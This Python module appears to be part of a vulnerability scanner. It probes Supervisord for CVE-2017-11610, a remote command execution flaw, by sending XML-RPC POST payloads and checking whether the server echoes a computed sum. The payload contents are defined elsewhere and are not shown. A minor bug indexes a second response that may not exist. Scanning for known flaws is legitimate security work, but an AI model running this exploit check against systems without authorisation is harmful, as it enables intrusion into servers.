#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.logger import logger
from thirdparty import requests

def cve_2017_11610_scan(self, url):
    ''' Supervisord曝出了一个需认证的远程命令执行漏洞(CVE-2017-11610)
        通过POST请求向Supervisord管理界面提交恶意数据, 可以获取服务器操作权限, 带来严重的安全风险
    '''
    vul_info = {}
    vul_info['app_name'] = self.app_name
    vul_info['vul_type'] = 'RCE'
    vul_info['vul_id'] = 'CVE-2017-11610'
    # vul_info['vul_method'] = 'POST'
    vul_info['headers'] = {
        'Content-Type': 'text/xml'
    }

    headers = self.headers.copy()
    headers.update(vul_info['headers'])

    res_list = []

    for payload in self.cve_2017_11610_payloads:
        path = payload['path']
        data = payload['data']
        target = url + path

        vul_info['path'] = path
        vul_info['data'] = data
        vul_info['target'] = target

        try:
            res = requests.post(
                target, 
                timeout=self.timeout, 
                headers=headers,
                data=data, 
                proxies=self.proxies, 
                verify=False,
                allow_redirects=False
            )
            logger.logging(vul_info, res.status_code, res)                        # * LOG
            res_list.append(res)

            if (str(self.random_num_1 + self.random_num_2) in res.text):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request-1': res_list[0],
                    'Request-2': res_list[1]
                }
                return results
        except requests.ConnectTimeout:
            logger.logging(vul_info, 'Timeout')
            return None
        except requests.ConnectionError:
            logger.logging(vul_info, 'Faild')
            return None
        except:
            logger.logging(vul_info, 'Error')
            return None
